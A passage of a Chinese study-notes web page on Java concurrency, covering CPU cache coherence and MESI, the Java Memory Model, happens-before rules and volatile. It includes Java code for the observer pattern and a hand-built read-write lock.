The value updated from <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> to <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
Update the value to <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
The value updated from <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> to <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
Update the value to <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
The value updated from <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> to <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
The value updated from <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> to <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
Update the value to <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
The value updated from <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> to <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
Update the value to <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CPU缓存一致性问题">CPU缓存一致性问题</h2>
<pre><code>	- 解决方式1：总线加锁方式
	- 解决方式2：CPU高速缓存一致性协议
</code></pre>
<p>​		在现代计算机中，CPU 的速度是极高的，如果 CPU 需要存取数据时都直接与内存打交道，在存取过程中，CPU 将一直空闲，这是一种极大的浪费，所以，为了提高处理速度，CPU 不直接和内存进行通信，而是在 CPU 与内存之间加入很多寄存器，多级缓存，它们比内存的存取速度高得多，这样就解决了 CPU 运算速度和内存读取速度不一致问题。</p>
<p>​		由于 CPU 与内存之间加入了缓存，在进行数据操作时，先将数据从内存拷贝到缓存中，CPU 直接操作的是缓存中的数据。但在多处理器下，将可能导致各自的缓存数据不一致（这也是可见性问题的由来），为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议，而<strong>嗅探是实现缓存一致性的常见机制</strong>。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-77acfee471d8827a2121157c68f2485d_720w-1667230559743-56.jpg" alt="img"></p>
<p>​		在缓存一致性协议中最为出名的时Intel的==MESI==协议。MESI协议保证了每个缓存中使用的共享变量副本是一致的，她的大致思想是：当CPU在操作Cache中的数据时，如果发现该变量是一个共享变量，也就是说在其他的CPU Cache 中也存在一个副本，那么进行如下操作：</p>
<p>​		① 读取操作，不做任何处理，只是将Cache中的数据读取到寄存器</p>
<p>​		② 写入操作，发出信号通知其他CPU将该变量的Cache line置为无效标志，其他CPU在进行该变量读取数据的时候就不得不到主内存中再次获取。</p>
<h2 id="Java内存模型JMM（Java-Memory-Model）">Java内存模型JMM（Java Memory Model）</h2>
<p>​		Java的内存模型决定了一个线程对共享变量的写入如何让其他线程可见，Java内存模型定义了线程和主内存之间的抽象关系</p>
<ul>
<li>共享变量存储于主内存之中，每个线程都可以访问。</li>
<li>每个线程都有私有的工作内存（或者叫做本地内存）</li>
<li>线程不能直接操作主内存，只是先操作了工作内存之后，才写入主内存</li>
<li>工作内存和Java内存模型一样，也是一个抽象的概念，其实并不存在。它涵盖了缓存、寄存器、编译器优化以及硬件等。</li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220105142137063-1667230559746-57.png" alt="image-20220105142137063"></p>
<h2 id="JMM与并发编程的三大特性">JMM与并发编程的三大特性</h2>
<h3 id="原子性">原子性</h3>
<p>一个操作或者多个操作，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行</p>
<pre class="line-numbers language-none"><code class="language-none">JMM 仅保证了基本数据类型的读写的原子性操作，其他均不保证。
如果想要保证某段代码具有原子性，需要使用synchronized 或者 JUC 中的lock。
如果想要int等类型的自增操作具有原子性，可以使用JUC包下的原子封装类型：`java.util.concurrent.atomic`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="可见性">可见性</h3>
<pre class="line-numbers language-none"><code class="language-none">Java提供了以下三种方式保证可见性
①volatile关键字
②synchronized关键字
③JUC提供的显示锁Lock <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="有序性">有序性</h3>
<pre class="line-numbers language-none"><code class="language-none">Java提供了以下三种方式保证有序性
①volatile关键字
②synchronized关键字
③JUC提供的显示锁Lock <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Happens-before原则：JMM具备的天生的有序性规则">Happens-before原则：JMM具备的天生的有序性规则</h2>
<ul>
<li>
<p>程序次序规则</p>
<pre class="line-numbers language-none"><code class="language-none">在一个线程内，代码按照编写时的次序执行，编写在后面的操作发生于编写在前面的操作之后。

这句话的意思看起来是程序按照編写的顺序来执行，但是虚拟机还是可能会对程序代码的指令进行重排序，只要确保在一个线程内最终的结果和代码顺序执行的结果一致即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>锁定规则</p>
<pre class="line-numbers language-none"><code class="language-none">一个unlock操作要先行发生于对同一个锁的lock操作

这句话的意思是，无论是在单线程还是在多线程的环境下，如果同一个锁是锁定状态，那么必须先对其执行释放操作之后才能继续进行lock操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>volatile变量规则</p>
<pre class="line-numbers language-none"><code class="language-none">对一个变量的写操作要早于对这个变量之后的读操作

根据字面的意思来理解是，如果一个变量使用volatlle关键字修饰，一个线程对它进行读操作，一个线程对它进行写操作，那么写入操作肯定要先行发生于读操作，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>传递规则</p>
<pre class="line-numbers language-none"><code class="language-none">如果操作A先于操作B，而操作B又先于操作c，则可以得出操作A肯定要先于操作C，这一点说明了happens-before原则具各传递性<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>线程启动规则</p>
<pre class="line-numbers language-none"><code class="language-none">Thread对象的start()方法先行发生于对该线程的任何操作，所以才说：只有start之后线程才能真正运行，否则Thread也只是一个对象而已<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>线程中断规则</p>
<pre class="line-numbers language-none"><code class="language-none">对线程执行interrupt()方法肯定要优先于捕获到中断信号

这句话的意思是指如果线程收到了中断信号，那么在此之前势必要有interrupt()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>线程的终结规则</p>
<pre class="line-numbers language-none"><code class="language-none">线程中所有的操作都要先行发生于线程的终止检测
通俗地讲，线程的任务执行、逻辑单元执行肯定要发生于线程死亡之前。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>对象的终结规则</p>
<pre class="line-numbers language-none"><code class="language-none">一个对象初始化的完成先行发生于finalwe()方法之前，这个更没什么好说的了，先有生后有死<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h2 id="volatile-关键字特性总结">volatile 关键字特性总结</h2>
<ol>
<li>保证重排序的时候，不会把后面的指令放到屏障之前，也不会把前面的放到后面</li>
<li>强制对缓存的修改操作立刻写入主存</li>
<li>如果是写操作，会导致其他CPU中的缓存失效。</li>
</ol>
<h1>Chapter4：观察者模式</h1>
<blockquote>
<p>Java高并发编程详解：第十五章</p>
</blockquote>
<p>参考：<a href="http://c.biancheng.net/view/1390.html">http://c.biancheng.net/view/1390.html</a></p>
<ul>
<li>Demo1</li>
</ul>
<p>设计模式图</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220109155129782-1667230559746-58.png" alt="image-20220109155129782"></p>
<p>代码示例：监控对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Observer</span><span class="token punctuation">&gt;</span></span> observers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> state<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setState</span><span class="token punctuation">(</span><span class="token keyword">int</span> state<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">==</span> state<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> state<span class="token punctuation">;</span>
        <span class="token comment">// Subject存在变更，observers同步执行</span>
        <span class="token function">notifyAllObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">notifyAllObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        observers<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">Observer</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attach</span><span class="token punctuation">(</span><span class="token class-name">Observer</span> observer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>observer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token class-name">Subject</span> subject<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>subject <span class="token operator">=</span> subject<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 执行体由不同的Observer子类完成</span>
    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BinaryObserver</span> <span class="token keyword">extends</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token class-name">BinaryObserver</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Binary String:"</span> <span class="token operator">+</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span>subject<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OctalObserver</span> <span class="token keyword">extends</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">OctalObserver</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Octal String:"</span> <span class="token operator">+</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toOctalString</span><span class="token punctuation">(</span>subject<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObserverPatternDemo</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Subject</span> subject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Subject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">BinaryObserver</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">OctalObserver</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"===============1=========="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        subject<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"===============2=========="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        subject<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"===============3=========="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        subject<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter5：Single Thread Execution 设计模式</h1>
<p>单线程执行设计模式</p>
<blockquote>
<p>Java高并发编程详解：第十六章</p>
</blockquote>
<p>线程不安全原因：</p>
<ol>
<li>共享资源</li>
<li>临界值</li>
<li>多线程竞争（各线程都会有可能变更共享资源的状态）</li>
</ol>
<p>解决：保证共享资源的写操作同一时间只有一个线程操作</p>
<p>#　Chapter６：读写锁分离设计模式</p>
<blockquote>
<p>Java高并发编程详解：第十七章</p>
</blockquote>
<p>共享资源在多个线程在进行读写操作时不会引起冲突</p>
<table>
<thead>
<tr>
<th style="text-align:center">线程</th>
<th style="text-align:center">读</th>
<th style="text-align:center">写</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">读</td>
<td style="text-align:center">不冲突</td>
<td style="text-align:center">冲突（只允许单线程运行）</td>
</tr>
<tr>
<td style="text-align:center">写</td>
<td style="text-align:center">冲突（只允许单线程运行）</td>
<td style="text-align:center">冲突（只允许单线程运行）</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 读写分离锁
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReadWriteLock</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> readingReaders <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> waitingReaders <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> writingWriters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> waitingWriters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token comment">// 控制倾向性，有写操作等待时，优先执行</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> preferWriter<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ReadWriteLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>preferWriter <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">ReadWriteLock</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> preferWriter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>preferWriter <span class="token operator">=</span> preferWriter<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>waitingReaders<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>writingWriters <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>preferWriter <span class="token operator">&amp;&amp;</span> waitingWriters <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>readingReaders<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>waitingReaders<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">readUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>readingReaders<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>waitingWriters<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>readingReaders <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">||</span> writingWriters <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            writingWriters<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            waitingWriters<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">writeUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        writingWriters<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 共享资源读/写执行
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SharedData</span> <span class="token punctuation">{</span>

    <span class="token comment">// 共享资源</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer<span class="token punctuation">;</span>

    <span class="token comment">// 读写锁</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ReadWriteLock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReadWriteLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">SharedData</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 初始化共享资源</span>
        buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">readUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doWrite</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">writeUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">doWrite</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
            <span class="token function">slowly</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * @return：共享资源的副本
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">doRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newBuf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>buffer<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            newBuf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token function">slowly</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> newBuf<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


